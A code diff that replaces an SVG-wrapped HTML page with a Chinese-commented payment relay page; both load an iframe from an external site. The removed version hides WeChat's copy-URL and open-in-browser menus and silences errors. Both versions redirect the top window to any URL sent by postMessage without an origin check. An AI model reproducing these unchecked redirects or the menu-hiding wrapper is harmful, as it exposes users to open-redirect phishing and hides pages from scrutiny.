@@ -1,273 +1,298 @@
-<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100%" height="100%">
-  <foreignObject width="100%" height="100%">
-    <html xmlns="http://www.w3.org/1999/xhtml">
-      <head>
-        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
-        <title>Rebuild APP</title>
-        <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script>
-        <script>
-          if (typeof wx !== 'undefined') {
-            window.wxjs = wx;
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
+  <title>支付中转（支持顶层打开与 iframe 白名单）</title>
+  <!-- 可选：微信 JS-SDK（如果需要微信唤起能力） -->
+  <!-- <script src="https://res.wx.qq.com/open/js/jweixin-1.6.0.js"></script> -->
+  <style>
+    html,body{height:100%;margin:0;padding:0;background:#fff;}
+    #dynamicIframe{display:block;width:100%;height:100%;border:0;}
+    #statusBar{position:fixed;left:8px;right:8px;bottom:12px;padding:8px 12px;background:rgba(0,0,0,0.6);color:#fff;border-radius:6px;font-size:13px;z-index:9999;display:none;}
+    #openHint{display:none;}
+  </style>
+</head>
+<body>
+  <!-- iframe：仅在允许内嵌或检测后内嵌 -->
+  <iframe id="dynamicIframe" src="" frameborder="0" sandbox="allow-scripts allow-forms allow-same-origin"></iframe>
+
+  <div id="statusBar"></div>
+
+<script>
+/*
+  完整 HTML + JS：
+  - 优先顶层打开 (window.top.location.href)
+  - 若访问 window.top 被限制，回退到 <a target="_blank"> click -> window.open
+  - urlscheme（非 http/https）优先顶层打开以唤起 APP
+  - 只有 ALLOWED_IFRAME_ORIGINS 中的 origin 会被内嵌；其它一律顶层打开
+  - 可选使用 CHECK_FRAMEABLE_API 后端检测（HEAD 检测 X-Frame-Options/CSP）
+*/
+
+/* ====== 配置（请根据你的环境修改） ====== */
+const FIXED_IFRAME_URL = "https://h5.mrhl.top/"; // 默认内嵌页面（示例）
+const ALLOWED_IFRAME_ORIGINS = [new URL(FIXED_IFRAME_URL).origin]; // 允许内嵌的 origin 白名单
+const CHECK_FRAMEABLE_API = '/api/check_frameable.php'; // 后端检测接口，若不使用请置 ''（空字符串）
+const IFRAME_LOAD_FALLBACK_MS = 8000; // iframe 加载后若仍受阻塞，多少 ms 后回退到顶层打开（保守兜底）
+/* ====== 配置结束 ====== */
+
+/* 工具函数 */
+function getOrigin(url) {
+  try { return new URL(url, window.location.href).origin; } catch (e) { return null; }
+}
+function isHttpUrl(s) { return typeof s === 'string' && /^https?:\/\//i.test(s); }
+function isUrlScheme(s) { return typeof s === 'string' && /^[a-zA-Z0-9+\-.]+:\/\//.test(s) && !/^https?:\/\//i.test(s); }
+function isAllowedIframeOrigin(url) {
+  const origin = getOrigin(url);
+  if (!origin) return false;
+  return ALLOWED_IFRAME_ORIGINS.indexOf(origin) !== -1;
+}
+function showStatus(text, timeout = 3000) {
+  const bar = document.getElementById('statusBar');
+  bar.innerText = text;
+  bar.style.display = 'block';
+  if (timeout > 0) setTimeout(()=> { bar.style.display = 'none'; }, timeout);
+}
+
+/* 尝试顶层导航（覆盖整个浏览器窗口） */
+function tryTopNavigate(url) {
+  try {
+    if (window.top && window.top !== window.self) {
+      window.top.location.href = url;
+    } else {
+      window.location.href = url;
+    }
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+/* 用 <a target=_blank> 模拟用户点击（在微信内比 window.open 更可靠） */
+function tryAnchorOpen(url, newWindow = true) {
+  try {
+    const a = document.createElement('a');
+    a.href = url;
+    a.rel = 'noreferrer noopener';
+    a.target = newWindow ? '_blank' : '_self';
+    // style to hide and avoid visual impact
+    a.style.position = 'fixed';
+    a.style.left = '-9999px';
+    document.body.appendChild(a);
+
+    // Some browsers require the click to be "user initiated". Creating and dispatching a MouseEvent helps.
+    const ev = document.createEvent('MouseEvents');
+    ev.initMouseEvent('click', true, true, window);
+    a.dispatchEvent(ev);
+
+    // cleanup
+    setTimeout(() => { try { document.body.removeChild(a); } catch(e) {} }, 1000);
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+/* 最终回退：window.open */
+function tryWindowOpen(url) {
+  try {
+    window.open(url, '_blank');
+    return true;
+  } catch (e) {
+    return false;
+  }
+}
+
+/* openExternal: 统一打开外部链接的函数（按优先级尝试） */
+async function openExternal(url, options = { preferNewWindow: false }) {
+  if (!url) return false;
+
+  // urlscheme -> 直接顶层打开以唤起 APP
+  if (isUrlScheme(url)) {
+    // 先尝试顶层
+    if (tryTopNavigate(url)) return true;
+    // 再尝试 anchor
+    if (tryAnchorOpen(url, false)) return true;
+    // 最后 window.open
+    return tryWindowOpen(url);
+  }
+
+  // http(s) -> 优先顶层打开（以避免被 iframe 限制）
+  if (isHttpUrl(url)) {
+    // 1) 尝试顶层导航
+    if (tryTopNavigate(url)) return true;
+
+    // 2) 若顶层受限，则尝试使用 <a target=_blank>
+    if (tryAnchorOpen(url, options.preferNewWindow || true)) return true;
+
+    // 3) 最后尝试 window.open
+    return tryWindowOpen(url);
+  }
+
+  // 非标准情况，兜底使用顶层导航或 new window
+  if (tryTopNavigate(url)) return true;
+  if (tryAnchorOpen(url, true)) return true;
+  return tryWindowOpen(url);
+}
+
+/* 可选：调用后端检测接口判断目标是否可被 iframe 嵌入
+   返回 { frameable: true|false, reason: '...' } 或在异常时返回 { frameable: false, reason: 'check_error' } */
+async function checkFrameableByBackend(targetUrl) {
+  if (!CHECK_FRAMEABLE_API) return { frameable: isAllowedIframeOrigin(targetUrl), reason: 'no_check_api' };
+  try {
+    const resp = await fetch(CHECK_FRAMEABLE_API + '?url=' + encodeURIComponent(targetUrl), { method: 'GET', credentials: 'omit' });
+    if (!resp.ok) return { frameable: false, reason: 'check_api_http_' + resp.status };
+    const data = await resp.json();
+    return data;
+  } catch (e) {
+    return { frameable: false, reason: 'check_exception', error: e && e.message };
+  }
+}
+
+/* 初始化：装载 iframe（先检查是否允许内嵌） */
+(async function initIframe() {
+  const iframe = document.getElementById('dynamicIframe');
+  // 合并当前 url query 到 iframe 初始 url（保持原有参数透传）
+  const params = new URLSearchParams(window.location.search);
+  let iframeUrl = FIXED_IFRAME_URL;
+  if ([...params].length) {
+    iframeUrl += (iframeUrl.includes('?') ? '&' : '?') + [...params].map(([k,v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
+  }
+
+  // 1) 白名单直接内嵌
+  if (isAllowedIframeOrigin(iframeUrl)) {
+    iframe.src = iframeUrl;
+    // 兜底：若 8s 后 iframe 依然被阻止渲染（某些浏览器会抛异常或显示空白），尝试顶层打开
+    setTimeout(() => {
+      try {
+        // 如果能访问 contentDocument 并且空白（children 为空），认为被阻止或渲染失败 -> 顶层打开
+        if (iframe && iframe.contentDocument) {
+          const body = iframe.contentDocument.body;
+          if (body && body.children.length === 0) {
+            openExternal(iframe.src);
           }
-        </script>
-        <style>
-          *{margin:0;padding:0;}
-          html,body{width:100%;height:100%;}
-          #dynamicIframe{display:block;width:100%;height:100%;border:0;}
-        </style>
-      </head>
-      <body translate="no">
-        <iframe id="dynamicIframe" src="" frameborder="0"></iframe>
+        }
+      } catch (e) {
+        // 访问 iframe.contentDocument 跨域会抛异常，通常表示已嵌入但跨域；这时若页面被阻止渲染也应顶层打开
+        // 为安全起见不强制 open，保留现状（如需更激进的回退可解除下面注释）
+        // openExternal(iframe.src);
+      }
+    }, IFRAME_LOAD_FALLBACK_MS);
+    return;
+  }
 
-        <script>
-          window.addEventListener('error', function(e) {
-            return false;
-          });
-          
-          window.addEventListener('unhandledrejection', function(e) {
-            e.preventDefault();
-          });
+  // 2) 非白名单 -> 可选后端检测（HEAD 检测 X-Frame-Options/CSP）
+  const check = await checkFrameableByBackend(iframeUrl);
+  if (check && check.frameable) {
+    iframe.src = iframeUrl;
+    return;
+  }
 
-          const FIXED_IFRAME_URL = "https://h5.mrhl.top/";
-          const FIXED_SIGN_URL = "https://beachercotton.github.io/xincai6666/";
+  // 3) 不可内嵌 -> 直接顶层打开
+  openExternal(iframeUrl);
+})();
 
-          const isWeChatBrowser = /MicroMessenger/i.test(navigator.userAgent);
-          if (isWeChatBrowser && window.wxjs) {
-            fetch("https://api.tthaol.com/api/wechat/getJsapiTicket", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ url: FIXED_SIGN_URL })
-            })
-            .then(r => {
-              if (!r.ok) {
-                throw new Error(`HTTP ${r.status}: ${r.statusText}`);
-              }
-              return r.json();
-            })
-            .then(res => {
-              if (res && res.data) {
-                try {
-                  window.wxjs.config({
-                    debug: false,
-                    appId: res.data.appId,
-                    timestamp: res.data.timestamp,
-                    nonceStr: res.data.nonceStr,
-                    signature: res.data.signature,
-                    jsApiList: ["hideOptionMenu", "hideMenuItems", "closeWindow"]
-                  });
-                  window.wxjs.ready(() => {
-                    window.wxjs.hideOptionMenu();
-                    window.wxjs.hideMenuItems({
-                      menuList: [
-                        "menuItem:share:appMessage",
-                        "menuItem:share:timeline",
-                        "menuItem:copyUrl",
-                        "menuItem:openWithQQBrowser",
-                        "menuItem:openWithSafari"
-                      ]
-                    });
-                  });
-                  window.wxjs.error(err => {
-                  });
-                } catch (e) {
-                }
-              }
-            })
-            .catch(err => {
-            });
-          }
+/* postMessage 事件处理：支持 redirect / iframe_navigate / payment_redirect / handle_payment 等 */
+window.addEventListener('message', async function(ev) {
+  try {
+    const data = ev && ev.data;
+    if (!data || typeof data !== 'object') return;
+    const action = data.action;
+    const iframe = document.getElementById('dynamicIframe');
 
-          function checkWechatCallback() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const code = urlParams.get('code');
-            const state = urlParams.get('state');
-            
-            if (code && state) {
-              try {
-                const stateData = JSON.parse(state);
-                if (stateData.source === 'wechat_login') {
-                  return { code, state, isWechatCallback: true };
-                }
-              } catch (e) {}
-            }
-            return { isWechatCallback: false };
-          }
+    // redirect & wechat_authorize -> 顶层打开
+    if ((action === 'redirect' || action === 'wechat_authorize') && typeof data.url === 'string' && data.url) {
+      showStatus('正在跳转到支付页面...');
+      await openExternal(data.url);
+      return;
+    }
 
-          (function loadIframe(){
-            const iframe = document.getElementById("dynamicIframe");
-            const callbackInfo = checkWechatCallback();
-            
-            let iframeUrl = FIXED_IFRAME_URL;
-            
-            if (callbackInfo.isWechatCallback) {
-              const separator = iframeUrl.includes('?') ? '&' : '?';
-              iframeUrl += `${separator}code=${callbackInfo.code}&state=${encodeURIComponent(callbackInfo.state)}`;
-            } else {
-              const currentParams = new URLSearchParams(window.location.search);
-              const params = [];
-              
-              for (const [key, value] of currentParams) {
-                params.push(`${key}=${encodeURIComponent(value)}`);
-              }
-              
-              if (params.length > 0) {
-                const separator = iframeUrl.includes('?') ? '&' : '?';
-                iframeUrl += `${separator}${params.join('&')}`;
-              }
-            }
-            
-            iframe.src = iframeUrl;
-            
-            iframe.onload = function() {
-              setTimeout(() => {
-                try {
-                  if (iframe.contentWindow) {
-                    iframe.contentWindow.postMessage({
-                      action: 'set_iframe_parent_url',
-                      iframe_parent_url: window.location.href,
-                      parent_origin: window.location.origin,
-                      is_embedded: window.self !== window.top,
-                      environment: 'svg_iframe'
-                    }, '*');
-                  }
-                } catch (e) {
-                }
-              }, 1000);
-            };
-          })();
+    // iframe_navigate -> 若目标被允许内嵌则设置 iframe.src，否则顶层打开
+    if (action === 'iframe_navigate' && typeof data.url === 'string' && data.url) {
+      const targetUrl = data.url;
+      // 优先白名单
+      if (isAllowedIframeOrigin(targetUrl)) {
+        iframe.src = targetUrl;
+        return;
+      }
+      // 否则调用后端检测
+      const check = await checkFrameableByBackend(targetUrl);
+      if (check && check.frameable) {
+        iframe.src = targetUrl;
+      } else {
+        showStatus('目标无法内嵌，正在顶层打开...');
+        await openExternal(targetUrl);
+      }
+      return;
+    }
 
-          window.addEventListener("message", function(event) {
-            try {
-              if (!event.data || typeof event.data !== 'object') {
-                return;
-              }
+    // payment_redirect -> 顶层打开（并尝试通知父窗口）
+    if (action === 'payment_redirect' && typeof data.url === 'string' && data.url) {
+      const target = data.url;
+      // 如果在嵌套上下文，先通知父窗口（兼容多层嵌套）
+      if (window.self !== window.top) {
+        try { window.parent.postMessage({ action:'redirect', url: target }, '*'); } catch(e) {}
+        // 稍等父窗口处理后再尝试打开
+        setTimeout(() => { openExternal(target); }, 150);
+      } else {
+        openExternal(target);
+      }
+      return;
+    }
 
-              const { action, url } = event.data;
-              
-              if (action === "redirect" && typeof url === "string" && url) {
-                window.location.href = url;
-              }
-              
-              if (action === "wechat_authorize" && typeof url === "string" && url) {
-                window.location.href = url;
-              }
-              
-              if (action === "iframe_navigate" && typeof url === "string" && url) {
-                const iframe = document.getElementById("dynamicIframe");
-                if (iframe) {
-                  iframe.src = url;
-                }
-              }
-              
-              if (action === "get_client_domain") {
-                const iframe = document.getElementById("dynamicIframe");
-                if (iframe && iframe.contentWindow) {
-                  try {
-                    iframe.contentWindow.postMessage({
-                      action: 'client_domain_response',
-                      clientDomain: FIXED_IFRAME_URL,
-                      iframeDomain: FIXED_SIGN_URL
-                    }, '*');
-                  } catch (e) {
-                  }
-                }
-              }
-              
-              if (action === "payment_redirect" && typeof url === "string" && url) {
-                if (window.self !== window.top) {
-                  try {
-                    window.parent.postMessage({
-                      action: 'redirect',
-                      url: url
-                    }, '*');
-                    
-                    setTimeout(() => {
-                      window.location.href = url;
-                    }, 1000);
-                  } catch (e) {
-                    window.location.href = url;
-                  }
-                } else {
-                  window.location.href = url;
-                }
-              }
-              
-              if (action === "handle_payment" && event.data.payUrl) {
-                const { payUrl, paymentType, userAgent, isWechatBrowser, isAlipayBrowser } = event.data;
-                
-                const iframe = document.getElementById("dynamicIframe");
-                if (iframe && iframe.contentWindow) {
-                  try {
-                    iframe.contentWindow.postMessage({
-                      action: 'payment_handled'
-                    }, '*');
-                  } catch (e) {
-                  }
-                }
-                
-                if (paymentType === 'wechat' && payUrl.startsWith('weixin://wxpay/')) {
-                  if (isWechatBrowser && window.wxjs) {
-                    try {
-                      const urlParams = new URLSearchParams(payUrl.split('?')[1]);
-                      const paySign = urlParams.get('pr');
-                      
-                      if (paySign) {
-                        window.wxjs.ready(() => {
-                          window.wxjs.chooseWXPay({
-                            timestamp: Math.floor(Date.now() / 1000).toString(),
-                            nonceStr: 'wx_pay_' + Date.now(),
-                            package: 'prepay_id=' + paySign,
-                            signType: 'MD5',
-                            paySign: paySign,
-                            success: function (res) {
-                              if (iframe && iframe.contentWindow) {
-                                iframe.contentWindow.postMessage({
-                                  action: 'payment_success'
-                                }, '*');
-                              }
-                            },
-                            fail: function (res) {
-                              window.location.href = payUrl;
-                            }
-                          });
-                        });
-                      } else {
-                        window.location.href = payUrl;
-                      }
-                    } catch (e) {
-                      window.location.href = payUrl;
-                    }
-                  } else {
-                    window.location.href = payUrl;
-                  }
-                } else if (paymentType === 'alipay' && (payUrl.startsWith('alipays://') || payUrl.includes('alipay.com'))) {
-                  if (isAlipayBrowser) {
-                    window.location.href = payUrl;
-                  } else {
-                    const userAgent = navigator.userAgent.toLowerCase();
-                    const isIOS = /iphone|ipad/.test(userAgent);
-                    const isAndroid = userAgent.includes('android');
-                    
-                    if (isIOS || isAndroid) {
-                      window.location.href = payUrl;
-                      
-                      setTimeout(() => {
-                        alert('请安装支付宝客户端或在支付宝中打开');
-                      }, 2000);
-                    } else {
-                      window.location.href = payUrl;
-                    }
-                  }
-                } else {
-                  window.location.href = payUrl;
-                }
-              }
-            } catch (e) {
-            }
-          });
-        </script>
-      </body>
-    </html>
-  </foreignObject>
-</svg>
+    // handle_payment -> payUrl / paymentType 统一处理
+    if (action === 'handle_payment' && typeof data.payUrl === 'string' && data.payUrl) {
+      const payUrl = data.payUrl;
+      const paymentType = data.paymentType || '';
+
+      // 如果是 urlscheme（weixin:// alipay:// etc），直接尝试顶层唤起
+      if (isUrlScheme(payUrl)) {
+        showStatus('尝试唤起支付客户端...');
+        await openExternal(payUrl);
+        // 若唤起失败，浏览器通常不会抛异常，我们无法精确判断，建议前端同时提供备用 H5 链接
+        return;
+      }
+
+      // http(s) 链接：若在白名单或检测允许则内嵌，否则顶层打开
+      if (isHttpUrl(payUrl)) {
+        if (isAllowedIframeOrigin(payUrl)) {
+          iframe.src = payUrl;
+          return;
+        }
+        const check = await checkFrameableByBackend(payUrl);
+        if (check && check.frameable) {
+          iframe.src = payUrl;
+        } else {
+          showStatus('支付页面不允许内嵌，正在跳转...');
+          await openExternal(payUrl);
+        }
+        return;
+      }
+
+      // 兜底：顶层打开
+      await openExternal(payUrl);
+      return;
+    }
+
+    // get_client_domain -> 回复 iframe
+    if (action === 'get_client_domain') {
+      if (iframe && iframe.contentWindow) {
+        try {
+          iframe.contentWindow.postMessage({ action:'client_domain_response', clientDomain: FIXED_IFRAME_URL, iframeDomain: window.location.origin }, '*');
+        } catch (e) {}
+      }
+      return;
+    }
+
+  } catch (e) {
+    // swallow
+    console.error('message handler error', e);
+  }
+}, false);
+
+/* 防止一些未捕获错误在控制台暴露（可选） */
+window.addEventListener('error', function(e){ /* no-op */ }, true);
+window.addEventListener('unhandledrejection', function(e){ e.preventDefault(); }, true);
+</script>
+</body>
+</html>
